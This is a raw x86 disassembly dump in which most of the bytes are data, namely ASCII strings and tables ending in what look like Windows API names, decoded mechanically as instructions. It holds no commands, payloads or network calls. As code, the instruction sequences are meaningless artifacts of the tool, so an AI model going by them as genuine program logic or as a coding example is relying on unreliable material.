  42388b:	xor    bl,BYTE PTR [edi+0x4d]
  42388e:	xor    al,0x4a
  423890:	push   edx
  423891:	push   ebp
  423892:	add    BYTE PTR [esi+0x39],cl
  423895:	push   eax
  423896:	pop    edi
  423897:	push   ebp
  423898:	cmp    DWORD PTR [esi],esi
  42389a:	xor    BYTE PTR [ecx],dh
  42389c:	pop    edi
  42389d:	dec    edi
  42389e:	dec    esi
  42389f:	push   esp
  4238a0:	cmp    BYTE PTR [eax],al
  4238a2:	dec    esp
  4238a3:	xor    al,0x44
  4238a5:	xor    DWORD PTR [edi+0x4b],ebx
  4238a8:	xor    DWORD PTR [ebp+0x5f],eax
  4238ab:	pop    edx
  4238ac:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238b0:	pop    edi
  4238b1:	inc    edx
  4238b2:	xor    dh,BYTE PTR [ecx]
  4238b4:	push   ebx
  4238b5:	xor    DWORD PTR [ecx],edi
  4238b7:	inc    edx
  4238b8:	add    BYTE PTR [edi+0x45],al
  4238bb:	xor    al,0x38
  4238bd:	xor    BYTE PTR [eax],dh
  4238bf:	pop    edi
  4238c0:	dec    edx
  4238c1:	dec    ebx
  4238c2:	xor    eax,0x33345f4d
  4238c7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238cb:	pop    edi
  4238cc:	aaa    
  4238cd:	push   esi
  4238ce:	dec    ebx
  4238cf:	push   edx
  4238d0:	pop    edi
  4238d1:	inc    ebx
  4238d2:	add    BYTE PTR [edx+0x35],bl
  4238d5:	dec    ebp
  4238d6:	pop    edi
  4238d7:	inc    edi
  4238d8:	dec    esi
  4238d9:	xor    al,0x49
  4238db:	xor    eax,0x54590035
  4238e0:	push   edx
  4238e1:	pop    edi
  4238e2:	push   esp
  4238e3:	inc    ebx
  4238e4:	inc    ecx
  4238e5:	pop    edi
  4238e6:	cmp    DWORD PTR [ecx+0x41],ebx
  4238e9:	push   ebp
  4238ea:	pop    edi
  4238eb:	push   ebp
  4238ec:	inc    ebp
  4238ed:	add    BYTE PTR [esi+esi*1+0x35],cl
  4238f1:	pop    edi
  4238f2:	pop    eax
  4238f3:	dec    edx
  4238f4:	inc    edx
  4238f5:	inc    edi
  4238f6:	add    BYTE PTR [edx+0x36],al
  4238f9:	inc    ebx
  4238fa:	pop    edi
  4238fb:	xor    BYTE PTR ds:0x36464b,dh
  423901:	dec    ebx
  423902:	cmp    DWORD PTR [esi+0x37],eax
  423905:	xor    ebx,DWORD PTR [edi+0x35]
  423908:	ss inc edi
  42390a:	pop    ecx
  42390b:	dec    eax
  42390c:	pop    ecx
  42390d:	add    BYTE PTR [ebp+0x35],cl
  423910:	push   eax
  423911:	xor    BYTE PTR [edi+0x4f],bl
  423914:	pop    ecx
  423915:	xor    cl,BYTE PTR [edi+0x0]
  423918:	pop    ecx
  423919:	xor    DWORD PTR [esi+0x5f],ecx
  42391c:	xor    al,BYTE PTR [edx+0x30]
  42391f:	push   esi
  423920:	push   esp
  423921:	inc    ebp
  423922:	add    BYTE PTR [edi+0x37],al
  423925:	push   esi
  423926:	xor    DWORD PTR [edi+0x49],ebx
  423929:	xor    al,BYTE PTR [esi+0x30]
  42392c:	pop    edi
  42392d:	ss dec esi
  42392f:	cmp    BYTE PTR [eax],al
  423931:	pop    edx
  423932:	xor    eax,0x445f334b
  423937:	xor    BYTE PTR [eax],bh
  423939:	push   ecx
  42393a:	push   esi
  42393b:	xor    al,0x0
  42393d:	push   ebp
  42393e:	pop    eax
  42393f:	inc    edi
  423940:	xor    DWORD PTR [edi+0x39],ebx
  423943:	push   esp
  423944:	inc    ebx
  423945:	aaa    
  423946:	inc    esp
  423947:	add    BYTE PTR [edi+0x39],dl
  42394a:	ss pop edi
  42394c:	dec    eax
  42394d:	pop    edx
  42394e:	pop    ecx
  42394f:	inc    edi
  423950:	push   ebp
  423951:	pop    edi
  423952:	push   eax
  423953:	dec    eax
  423954:	inc    ebx
  423955:	add    BYTE PTR [ebp+0x0],dl
  423958:	xor    al,0x0
  42395a:	dec    edi
  42395b:	add    BYTE PTR [edi+0x0],bl
  42395e:	cmp    BYTE PTR [eax],al
  423960:	xor    al,BYTE PTR [eax]
  423962:	inc    ebx
  423963:	add    BYTE PTR [edx+0x0],bl
  423966:	inc    ebx
  423967:	add    BYTE PTR [edi],dh
  423969:	add    BYTE PTR [edi+0x0],bl
  42396c:	inc    ebx
  42396d:	add    BYTE PTR [eax+eax*1+0x0],al
  423971:	add    BYTE PTR [eax+eax*1+0x4b],cl
  423975:	add    BYTE PTR [edx],dh
  423977:	add    BYTE PTR [edi+0x0],bl
  42397a:	cmp    BYTE PTR [eax],al
  42397c:	dec    esp
  42397d:	add    BYTE PTR [esi+0x0],dl
  423980:	pop    edi
  423981:	add    BYTE PTR [ecx+0x0],bl
  423984:	push   edx
  423985:	add    BYTE PTR [esi+0x0],dl
  423988:	xor    al,BYTE PTR [eax]
  42398a:	cmp    BYTE PTR [eax],al
  42398c:	pop    edi
  42398d:	add    BYTE PTR [edx+0x0],cl
  423990:	add    BYTE PTR [eax],al
  423992:	inc    edx
  423993:	add    BYTE PTR [eax+eax*1+0x46],cl
  423997:	add    BYTE PTR [edi+0x0],bl
  42399a:	xor    eax,DWORD PTR [eax]
  42399c:	inc    ebp
  42399d:	add    BYTE PTR [ecx+0x0],cl
  4239a0:	push   edx
  4239a1:	add    BYTE PTR [ecx],bh
  4239a3:	add    BYTE PTR [esi+0x0],dl
  4239a6:	add    BYTE PTR [eax],al
  4239a8:	dec    ebp
  4239a9:	add    BYTE PTR [edi],dh
  4239ab:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239af:	add    BYTE PTR [edx+0x0],cl
  4239b2:	pop    eax
  4239b3:	add    BYTE PTR [ebx],dh
  4239b5:	add    BYTE PTR [ecx],dh
  4239b7:	add    BYTE PTR [ebx+0x0],al
  4239ba:	add    BYTE PTR [eax],al
  4239bc:	dec    edi
  4239bd:	add    BYTE PTR [esi],dh
  4239bf:	add    BYTE PTR [eax+0x0],cl
  4239c2:	pop    edi
  4239c3:	add    BYTE PTR [eax],dh
  4239c5:	add    BYTE PTR [edi],dh
  4239c7:	add    BYTE PTR [ecx],dh
  4239c9:	add    BYTE PTR [edx+0x0],dl
  4239cc:	xor    eax,0x55000000
  4239d1:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4239d5:	add    BYTE PTR [edi+0x0],bl
  4239d8:	push   esp
  4239d9:	add    BYTE PTR [ecx+0x0],al
  4239dc:	cmp    DWORD PTR [eax],eax
  4239de:	pop    edi
  4239df:	add    BYTE PTR [ebx],dh
  4239e1:	add    BYTE PTR [eax],dh
  4239e3:	add    BYTE PTR [eax],bh
  4239e5:	add    BYTE PTR [edi+0x0],cl
  4239e8:	inc    ebx
  4239e9:	add    BYTE PTR ds:0x4d000000,dh
  4239ef:	add    BYTE PTR [esi+0x0],cl
  4239f2:	inc    ebp
  4239f3:	add    BYTE PTR [edi+0x0],bl
  4239f6:	push   esp
  4239f7:	add    BYTE PTR [esi+0x0],al
  4239fa:	cmp    BYTE PTR [eax],al
  4239fc:	push   ebx
  4239fd:	add    BYTE PTR [edx+0x0],bl
  423a00:	pop    edi
  423a01:	add    BYTE PTR [eax],dh
  423a03:	add    BYTE PTR [eax],bh
  423a05:	add    BYTE PTR [eax+0x0],cl
  423a08:	add    BYTE PTR [eax],al
  423a0a:	dec    esi
  423a0b:	add    BYTE PTR [edi+0x0],cl
  423a0e:	pop    edx
  423a0f:	add    BYTE PTR [edi+0x0],bl
  423a12:	add    BYTE PTR ss:[ecx+0x0],bl
  423a16:	dec    ebp
  423a17:	add    BYTE PTR [esi],dh
  423a19:	add    BYTE PTR [ebx],dh
  423a1b:	add    BYTE PTR [edi+0x0],bl
  423a1e:	xor    al,0x0
  423a20:	dec    esi
  423a21:	add    BYTE PTR [edx],dh
  423a23:	add    BYTE PTR [esi],dh
  423a25:	add    BYTE PTR [ecx],dh
  423a27:	add    BYTE PTR [eax],al
  423a29:	add    BYTE PTR [ebx+0x0],cl
  423a2c:	dec    eax
  423a2d:	add    BYTE PTR [eax],bh
  423a2f:	add    BYTE PTR [edi+0x0],bl
  423a32:	inc    esi
  423a33:	add    BYTE PTR [esi+0x0],al
  423a36:	push   esp
  423a37:	add    BYTE PTR [edi],dh
  423a39:	add    BYTE PTR [esi],dh
  423a3b:	add    BYTE PTR [edi+0x0],bl
  423a3e:	dec    esp
  423a3f:	add    BYTE PTR [ecx+0x0],bl
  423a42:	add    BYTE PTR [eax],al
  423a44:	push   ebx
  423a45:	add    BYTE PTR [ecx+0x0],bl
  423a48:	xor    BYTE PTR [eax],al
  423a4a:	pop    edi
  423a4b:	add    BYTE PTR [ecx],bh
  423a4d:	add    BYTE PTR [edx+0x0],dl
  423a50:	dec    eax
  423a51:	add    BYTE PTR [ecx+0x0],bl
  423a54:	xor    al,BYTE PTR [eax]
  423a56:	pop    edi
  423a57:	add    BYTE PTR [eax],dh
  423a59:	add    BYTE PTR [eax],al
  423a5b:	add    BYTE PTR [edx+0x0],al
  423a5e:	dec    edx
  423a5f:	add    BYTE PTR [esi+0x0],cl
  423a62:	xor    al,BYTE PTR [eax]
  423a64:	pop    edi
  423a65:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a69:	add    BYTE PTR [edx+0x0],dl
  423a6c:	xor    al,0x0
  423a6e:	dec    eax
  423a6f:	add    BYTE PTR [eax],al
  423a71:	add    BYTE PTR [ebp+0x0],dl
  423a74:	add    BYTE PTR ss:[ebp+0x0],cl
  423a78:	xor    DWORD PTR [eax],eax
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [esi],dh
  423a7d:	add    BYTE PTR [ecx+0x0],bl
  423a80:	push   ebp
  423a81:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423a85:	add    BYTE PTR [edi+0x0],cl
  423a88:	inc    esp
  423a89:	add    BYTE PTR [edi+0x0],dl
  423a8c:	push   ebx
  423a8d:	add    BYTE PTR [eax],al
  423a8f:	add    BYTE PTR [edx+0x0],bl
  423a92:	inc    ebx
  423a93:	add    BYTE PTR [ebp+0x0],dl
  423a96:	pop    edi
  423a97:	add    BYTE PTR [ecx],dh
  423a99:	add    BYTE PTR [ebp+0x0],al
  423a9c:	push   esp
  423a9d:	add    BYTE PTR [eax],dh
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [eax],al
  423aa3:	add    BYTE PTR [eax],al
  423aa5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423aab:	inc    edx
  423aac:	add    BYTE PTR [eax],cl
  423aae:	add    BYTE PTR [edx+0x0],0xc
  423ab2:	add    BYTE PTR [edx+0x0],0x10
  423ab6:	add    BYTE PTR [edx+0x0],0x14
  423aba:	add    BYTE PTR [edx+0x0],0x18
  423abe:	add    BYTE PTR [edx+0x0],0x1c
  423ac2:	add    BYTE PTR [edx+0x0],0x20
  423ac6:	add    BYTE PTR [edx+0x0],0x24
  423aca:	add    BYTE PTR [edx+0x0],0x28
  423ace:	add    BYTE PTR [edx+0x0],0x0
	...
  423ae2:	add    BYTE PTR [eax],al
  423ae4:	sbb    edi,DWORD PTR [edi+0x4d57]
  423aea:	add    BYTE PTR [eax],al
  423aec:	adc    bh,BYTE PTR [ebx]
  423aee:	add    al,BYTE PTR [eax]
  423af0:	add    DWORD PTR [eax],eax
  423af2:	add    BYTE PTR [eax],al
  423af4:	add    DWORD PTR [eax],eax
  423af6:	add    BYTE PTR [eax],al
  423af8:	add    DWORD PTR [eax],eax
  423afa:	add    BYTE PTR [eax],al
  423afc:	or     BYTE PTR [ebx],bh
  423afe:	add    al,BYTE PTR [eax]
  423b00:	or     al,0x3b
  423b02:	add    al,BYTE PTR [eax]
  423b04:	adc    BYTE PTR [ebx],bh
  423b06:	add    al,BYTE PTR [eax]
  423b08:	inc    esi
  423b09:	iret   
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	push   ds
  423b0d:	cmp    eax,DWORD PTR [edx]
  423b0f:	add    BYTE PTR [eax],al
  423b11:	add    BYTE PTR [edi+0x6f],dl
  423b14:	jb     0x423b7a
  423b16:	push   edi
  423b17:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b1e:	aas    
  423b1f:	inc    ebp
  423b20:	outs   dx,BYTE PTR ds:[esi]
  423b21:	jne    0x423b90
  423b23:	push   edi
  423b24:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b2b:	popa   
  423b2c:	je     0x423b97
  423b2e:	outs   dx,DWORD PTR ds:[esi]
  423b2f:	outs   dx,BYTE PTR ds:[esi]
  423b30:	jae    0x423b85
  423b32:	je     0x423b95
  423b34:	.byte 0x74
